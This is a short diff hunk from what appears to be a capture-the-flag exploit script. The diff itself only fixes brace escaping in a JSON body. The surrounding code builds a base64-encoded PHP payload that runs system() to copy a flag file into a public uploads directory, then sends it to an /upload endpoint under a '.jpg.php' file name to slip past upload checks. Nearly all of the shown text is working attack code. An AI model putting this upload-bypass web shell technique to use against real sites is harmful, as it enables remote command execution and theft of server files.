@@ -213,12 +213,12 @@ payload = f"<?php system('cp /var/www/flag.txt /var/www/html/uploads/{fn}.txt');
 payload = b64encode(payload.encode())
 
 data = """
-\{\{
+{
    "name":"%s.jpg.php",
    "id":"ODIzODI5MTNiYmYw",
    "mime":"application/x-php",
    "body":"data:application/x-php;base64,%s"
-\}\}
+}
 """ % (fn, payload.decode())
 
 r = s.post(url+ '/upload',data=data)
